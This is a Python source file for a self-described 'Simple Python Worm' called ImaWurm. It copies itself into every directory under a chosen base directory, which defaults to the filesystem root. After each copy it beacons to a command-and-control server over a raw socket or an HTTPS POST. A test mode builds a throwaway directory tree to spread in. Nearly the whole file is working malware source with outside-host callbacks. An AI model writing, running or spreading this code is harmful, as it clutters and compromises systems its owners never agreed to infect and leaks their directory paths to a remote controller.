import argparse
import logging
import os
import shutil
import socket
import uuid
from urllib import request, parse


class Worm:
    def __init__(self, c2ip=None, c2port=None, c2sock=None, c2web=None, verbose=False):
        logging.basicConfig(
            format="[%(asctime)s] [%(levelname)s]: %(message)s",
            level=logging.INFO,
            datefmt="%Y-%m-%d %H:%M:%S",
        )
        if verbose:
            self.set_loglevel_debug()

        self.path = os.path.abspath(__file__)
        self.name = os.path.basename(self.path)

        logging.debug(f"Wurm path = {self.path}")
        logging.debug(f"Wurm name = {self.name}")

        if bool(c2ip) ^ bool(c2port):
            logging.error("If C2 should be used you need to specify both IP and port")
            raise Exception("C2 option not properly used")

        self.c2ip = c2ip
        self.c2port = c2port
        self.use_c2 = True

        self.c2sock = c2sock
        self.c2web = c2web

        logging.debug(f"Use C2 = {self.use_c2}")
        if self.use_c2:
            logging.debug(f"C2 IP = {self.c2ip}")
            logging.debug(f"C2 Port = {self.c2port}")

            if not (self.c2sock or self.c2web):
                logging.error(
                    "If C2 should be used you need to specify how to send data"
                )
                raise Exception("C2 option not properly used. Missing comm channel")

    @staticmethod
    def set_loglevel_debug():
        logging.getLogger().setLevel(logging.DEBUG)

    def contact_c2_web(self, msg):
        data = parse.urlencode({"msg": msg}).encode()
        req = request.Request(f"https://{self.c2ip}:{self.c2port}", data=data)
        try:
            request.urlopen(req)
        except:
            logging.error("Cannot send web data")
            pass

    def contact_c2_sock(self, msg):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.c2ip, int(self.c2port)))
            s.send(msg.encode())
        except:
            logging.error("Cannot send socket data")
            pass

    def duplicate(self, to):
        shutil.copy(self.path, to)
        logging.debug(f"Duplicated to {to}")

    def create_dirs(self, path_, depth, step=None):
        if step is None:
            step = depth
        elif step <= 0:
            return

        tmp_dirs = []
        for _ in range(depth):
            new_dir = os.path.join(path_, str(uuid.uuid4()))
            os.mkdir(new_dir)
            tmp_dirs.append(new_dir)
        for d in tmp_dirs:
            self.create_dirs(d, depth, step - 1)

    def proliferate(self, base_dir=None, depth=None, test=False, *args, **argw):
        """
        Spread the worm across the system. test is used as example and for testing purpose.
        If both base_dir and test are set, base_dir will be overwritten by the new test container directory.

        :param base_dir: Starting directory to propagate
        :param depth: how many directory should infect
        :param test: should create a <depth> number of new directories and use them to propagate
        """
        if depth is None:
            depth = 16

        if base_dir and test:
            logging.warn(
                f"Both base_dir and test set. Using new container directory as base_dir"
            )

        if test:
            self.set_loglevel_debug()
            base_dir = os.path.join(".", str(uuid.uuid4()))
            os.mkdir(base_dir)
            self.create_dirs(base_dir, depth)

        elif base_dir is None:
            # note: this has not been tested on windows
            base_dir, _ = self.path.split(os.sep, 1)
            if base_dir == "":
                base_dir = "/"

        logging.debug(f"Base reproduction directory = {base_dir}")
        logging.debug(f"Proliferation depth = {depth}")
        logging.debug(f"Should create new dirs (is this a test?) = {test}")

        for path_, dir_, file_ in os.walk(base_dir):
            logging.debug(f"path = {path_}, dir = {dir_}, file = {file_}")
            if self.name not in file_:
                self.duplicate(path_)
                if self.c2sock:
                    logging.debug("Sending Socket connection")
                    self.contact_c2_sock(f"Duplicated to {path_}")
                if self.c2web:
                    logging.debug("Sending Web connection")
                    self.contact_c2_web(f"Duplicated to {path_}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="ImaWurm", description="Simple Python Worm")
    parser.add_argument("-b", "--base-dir")
    parser.add_argument("-d", "--depth")
    parser.add_argument("-c2ip")
    parser.add_argument("-c2port")
    parser.add_argument("-c2sock", action="store_true")
    parser.add_argument("-c2web", action="store_true")
    parser.add_argument("-t", "--test", action="store_true")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    wurm = Worm(args.c2ip, args.c2port, args.c2sock, args.c2web, args.verbose)
    try:
        wurm.proliferate(
            base_dir=args.base_dir,
            depth=int(args.depth),
            test=args.test,
        )
    except TypeError:
        logging.exception("Depth MUST BE a number")
    except KeyboardInterrupt:
        logging.error("ABORTED!")
    except:
        raise
